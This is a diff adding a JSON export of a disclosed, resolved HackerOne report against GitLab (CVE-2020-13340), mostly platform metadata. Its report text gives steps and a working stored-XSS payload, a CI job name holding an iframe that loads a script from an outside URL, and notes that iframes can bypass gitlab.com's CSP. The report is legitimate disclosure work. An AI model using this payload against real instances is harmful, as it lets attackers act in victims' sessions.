@@ -1,0 +1,181 @@
+{
+  "id": 950190,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTA=",
+  "url": "https://hackerone.com/reports/950190",
+  "title": "Store-XSS in error message of build-dependencies ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-03T13:15:26.987Z",
+  "submitted_at": "2020-08-03T13:15:27.182Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yvvdwf",
+    "url": "/yvvdwf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-13340"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-12-01T08:04:06.926Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-01T08:04:06.860Z",
+  "team_member_agreed_on_going_public_at": "2020-11-30T23:22:00.345Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nA stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.\n\n### Steps to reproduce\n\nThe following steps should to be reproduced in a self-managed installation of gitlab\n\n1. Create an empty project\n2. Go to \"Settings/CI/CD/Runners\" to setup a runner for this project\n3. Create new file `.gitlab-ci.yml` for this project using the following content:\n\n```yaml\ntest<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:\n  stage: build\n  script: \n    - date > index.html\n  artifacts:\n    paths: \n      - index.html\n    expire_in: 1 second\n\njob-test:\n  stage: test\n  script: echo \"hi\"\n  dependencies: [\"test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>\"]\n```\n\n4. Wait for the jobs terminated, go to the detail of `job-test`\n5. You should see an alert that contains the current url\n\n### Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. \nFurthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.\n\n### What is the current *bug* behavior?\n\nThe `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)\n\n### What is the expected *correct* behavior?\n\nThe `failure_message` should be sanitized.\n\n### Relevant logs and/or screenshots\n\nPlease see a screenshot in attached file\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n```\nSystem information\nSystem:\t\tUbuntu 18.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.6p146\nGem Version:\t2.7.10\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t5.0.9\nGit Version:\t2.27.0\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.2.2-ee\nRevision:\t618883a1f9d\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t11.7\nURL:\t\thttp://gl.local\nHTTP Clone URL:\thttp://gl.local/some-group/some-project.git\nSSH Clone URL:\tgit@gl.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t13.3.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. \nFurthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 934607,
+      "file_name": "Screenshot_2020-08-03_at_14.50.32.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ts6SDeb8WLD5E5t8rC6amdda?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-08-03_at_14.50.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-08-03_at_14.50.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYYFOGIG%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T155910Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCCf9MpS5GH8cgjPX8iD24daHuYSTBOrppONLoHCldhUgIgOhJHgxzM2ISQFs1tZENDftiNJaQ5EKEC5rhLbiNKCZAqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKGYfXrgkDKDbh6AcyqOBaj16SY0NgSAyPvKfPmXsqW3AE%2BaErdwq9shSO0140FHec0eeejcWAd16zdAc7y6s%2F1VqroGsSL4MtN4oT7iYRsKqtBHX4bsHwOrJEpB%2FWOlprSIXM0RkgpVL2UJs5Dsnv%2Fx8Pj7I%2Fnf8L3AqTt7VhoUfu3r5vFEvkJaVo%2FBJkzk0d5XFKcWsSjHaispkIjjrijBm43Zzuqkl%2FSeuxzAQR7eJXkO%2FS0DKadDCZSDCa0gIqGcEAsGlMuSUy%2BL%2B5ddStzUVPDq14T0r8vjL1BG1RXSOnuI9%2FV2axGBE%2B36vPNahKsvtMUokbFBugHAzHLwKx%2BiI2n%2FJZj9Tysn8xXYWv3oCpvynOvQRlMh75ZRNZKkPFX3e8CCb2R5YwZuNUS1I0ULh91LeOZTNLeM0OoIZz5Sf%2B9Vqdkkcw2j7VAi1Kn8EuNli61UGbC42hbeVwEwlZwxbeL3%2Bws4trl3ykvZHgiIQ3pueKJFbBgeJLMl5WywY1Hg%2Fd4dFrK4uPn5o2N9oqoAT2QJvhKDUr0rc7CkFcsiBeUu1HMo9juSnrj9C3jK5VTLfchdD5VjLMgd8msE%2BfbS9dXTTzdCKyMxZ0vrfuFAJZQvvbagczoSuM2yRUOEXQlnC0pVnqhTa2dZ5th60%2BjF97H9fwdPb%2BC45zGAeZrwPe5jI72kB%2F6SF6CaCEGziIk35ZQZmx37p5DFI6dr9PJu3n%2B0IxDptbKTzLPpZhG9vFr8B2YZyZyKbrgVuh3aOmZ1tB%2FtCT%2FBs17fZyuT6RqrwaRlJ4%2F49d6U2076tyg2whGeb%2FYrH0fu5wM%2BZrX3rqt2XrFgurblKlVXJKPB4HWrNyYLJ2T4zyHW8plp9F8s5pfqyc0SNAciFKTstzDTl5bRBjqxAUiY3yMPA3l9HHicApgAnNIU4wcgeEIwtlOwmrvKfZ9H4FniPDZHXqGJ9MM1lxopaJkTRdI6HTiRkkV64IitApGfwjOLviBrInOE6ns%2FkvwdsdnF%2FynCGeLS5oJOnAg7DESXNNrIWTIyZMEdRAmWqyjEiTscX7%2BQIAeqS5KpbO5r90YdVlFdVXNSqmwq7c3gYwsNNWeCpV4PGwkBy7pJ96TxMXz8HodG2zU1W2MMn9do6Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3a14f4e9a99955ecdf6b40df49ef90e0d9d16b7e666d7c4299c8e66668018cd9",
+      "file_size": 962203,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 35,
+  "voters": [
+    "alpharingo",
+    "n1m0",
+    "sw33tlie",
+    "ali",
+    "bibekshah",
+    "tess",
+    "aryan2808",
+    "mik317",
+    "0xelkomy",
+    "zeroxyele",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
